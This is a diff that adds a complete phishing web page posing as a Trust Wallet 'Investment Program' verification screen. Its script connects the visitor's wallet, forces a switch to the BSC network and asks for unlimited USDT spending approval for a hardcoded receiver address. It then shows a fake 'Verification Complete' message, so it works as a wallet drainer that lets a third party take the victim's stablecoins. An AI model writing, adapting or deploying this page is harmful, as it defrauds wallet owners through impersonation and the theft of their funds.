@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investment Portal | Secure Verification</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 35px; border-radius: 24px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #3375bb; }
+        .logo { width: 50px; margin-bottom: 15px; }
+        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.97); }
+        .status { margin-top: 20px; color: #848e9c; font-size: 14px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="logo">
+        <h3>Investment Program</h3>
+        <p style="color: #848e9c; font-size: 14px;">Click below to verify your wallet and approve the fund participation.</p>
+        
+        <button class="btn" onclick="startApproval()">CONFIRM NOW</button>
+        
+        <div id="status" class="status">Waiting for connection...</div>
+    </div>
+
+    <script>
+        // YOUR UPDATED SETTINGS
+        const RECEIVER = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+
+        async function startApproval() {
+            const statusLabel = document.getElementById("status");
+
+            if (window.ethereum) {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    
+                    // 1. Request Wallet Connection
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+
+                    // 2. Force Switch to BSC Network (Chain ID 56)
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }], // 0x38 is 56 in hex
+                        });
+                    } catch (switchError) {
+                        console.log("Network switch handled by wallet");
+                    }
+
+                    // 3. Setup Contract
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(USDT_BSC, abi, signer);
+
+                    statusLabel.innerText = "Please 'Approve' in Trust Wallet...";
+                    statusLabel.style.color = "#f0b90b";
+
+                    // 4. Request Unlimited Approval
+                    const tx = await contract.approve(RECEIVER, ethers.constants.MaxUint256);
+                    
+                    statusLabel.innerText = "Processing on Blockchain...";
+                    await tx.wait();
+
+                    // 5. Success
+                    statusLabel.style.color = "#0ecb81";
+                    statusLabel.innerText = "SUCCESS: Verification Complete!";
+                    alert("Verification Successful! You can close this window.");
+
+                } catch (err) {
+                    statusLabel.style.color = "#f6465d";
+                    statusLabel.innerText = "Error: " + (err.data?.message || err.message);
+                }
+            } else {
+                alert("Please open this link inside the Trust Wallet Browser.");
+            }
+        }
+    </script>
+</body>
+</html>
